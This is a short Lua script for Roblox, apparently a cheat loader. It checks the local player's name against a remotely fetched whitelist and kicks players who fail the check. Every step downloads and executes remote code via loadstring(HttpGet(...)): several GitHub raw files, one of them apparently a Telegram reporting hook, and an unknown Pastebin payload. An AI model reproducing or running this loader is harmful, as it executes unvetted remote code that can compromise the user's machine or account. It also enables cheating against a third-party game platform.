local function check()
    local nicknames = loadstring(game:HttpGet("https://raw.githubusercontent.com/Maximusikk/newScript/refs/heads/main/nicknames"))()

    local playerName = game.Players.LocalPlayer.Name

    local isValid = false
    for _, nickname in ipairs(nicknames) do
        if nickname == playerName then
            isValid = true
            
            break
        end
    end

    if not isValid then
        loadstring(Game:HttpGet("https://raw.githubusercontent.com/Maximusikk/newScript/refs/heads/main/telegaMissChecked"))()
        game.Players.LocalPlayer:Kick("check didn't passed")
    end
    loadstring(Game:HttpGet("https://raw.githubusercontent.com/Maximusikk/newScript/refs/heads/main/discordBall.lua"))()
end

check()

loadstring(Game:HttpGet("https://pastebin.com/raw/UkvHkb7U"))()
